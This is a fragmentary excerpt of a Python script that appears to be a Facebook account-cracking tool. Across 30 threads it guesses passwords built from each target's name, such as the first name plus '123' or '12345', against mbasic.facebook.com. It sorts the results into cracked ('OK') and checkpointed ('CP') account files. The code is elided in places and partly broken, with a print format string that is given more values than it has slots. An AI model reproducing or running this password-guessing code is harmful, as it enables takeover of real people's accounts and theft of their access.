...
from concurrent.futures import ThreadPoolExecutor as sarfrazTOPU
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mTOPU_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mTOPU_CP.txt' % (H, P, str(len(cp))))
...
class __xxx__:
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with sarfrazTOPU(max_workers=30) as TOPUworld:
                ...
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        TOPUworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        else:
